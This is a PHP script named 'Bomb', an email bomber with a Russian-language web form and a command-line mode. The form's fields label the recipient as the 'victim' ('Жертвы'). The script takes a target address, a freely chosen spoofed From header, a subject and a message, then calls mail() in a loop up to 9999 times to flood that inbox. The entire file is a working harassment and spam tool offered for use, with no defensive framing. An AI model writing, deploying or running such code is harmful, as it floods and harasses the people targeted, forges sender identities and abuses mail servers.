<?php   

class Bomb {   

function cli() {   
  if(!defined("STDIN")) {   
      define("STDIN", fopen('php://stdin','r'));   
  }   

  print "Please enter the Target email Address : ";   
  $target = fread(STDIN, 80);   
  print "From = $target\n";   

  print "Please enter the from email Address :";   
  $from = fread(STDIN, 80);   
  print "From : $from\n";   


  print "Please enter your message to the target(800 chr) :";   
  $message = fread(STDIN, 800);   
  print "Your message is :\n";   
  print "$message";   

  print "Please enter a subject :";   
  $subject = fread(STDIN, 80);   
  print "Subject : $subject\n";   

  print "Please enter the Number of times to bomb(1-9999) :";   
  $times = fread(STDIN, 4);   
  print "Times : $times\n";   

      $this->send($target,$subject,$message,$from,$times);   
}   

function html() {   
  error_reporting(0);   
      $target = $_POST['target'];   
      $subject = $_POST['subject'];   
      $message = $_POST['message'];   
      $from = $_POST['from'];   
      $times = $_POST['times'];   
print "   
<html>   
<head><title>Спамилка  мыл</title>   
<style>   
body {   
background-color: #350000;   
color:#99ff32;   
font-size: 15px;   
}   

input {   
background-color: #222222;   
border: 1px solid #FFFFFF;   
color:#76defc;   
}   
a {   
color: #FFFFFF;   
}   
</style>   
<body>   
<center>   
<form action='' method='POST'>   
E-mail Жертвы :<br /> <INPUT NAME='target' TYPE='text'><BR>   
Текст сообщения : <br /><INPUT NAME='message' TYPE='text'><BR>   
Тема : <br /><INPUT NAME='subject' TYPE='text'><BR>   
От кого : <br /><INPUT NAME='from' TYPE='text'><BR>   
Кол-во писем (1-9999) : <br /><INPUT NAME='times' TYPE='text'><BR>   
<input type='submit' value='Спамить нах!'>   
</center>   
</body>   
</html>   
";   

  $this->send($target,$subject,$message,$from,$times);   
}   



function send($target,$subject,$message,$from,$times) {   
  $headers = "From: " . $from;    
  $i = 1;    
  while($i <= $times) {    
      mail($target, $subject, $message, $headers);    
      print "$i sent ";    
      $i++;    
      }   
  }   
}   


$bomb = new Bomb;   
$bomb->html(); // For HTML version   
#$bomb->cli(); // For CLI version   


?>